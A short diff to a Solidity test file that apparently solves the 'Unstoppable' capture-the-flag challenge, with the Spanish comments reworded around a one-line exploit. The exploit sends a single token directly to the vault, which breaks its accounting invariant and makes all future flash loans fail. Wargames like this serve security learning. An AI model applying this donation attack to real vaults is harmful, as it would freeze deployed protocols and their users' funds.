@@ -91,9 +91,12 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
-        // Enviar tokens directamente al vault (bypass deposit)
-       // Esto desbalancea totalAssets vs convertToShares(totalSupply)
-    token.transfer(address(vault), 1);
+
+        // SOLUCIÓN: Enviar 1 token directamente al vault para romper la invariante
+        // Esto desbalancea totalAssets() vs convertToShares(totalSupply)
+        // causando que todos los flash loans futuros fallen
+        
+        token.transfer(address(vault), 1);
     }
 
     /**
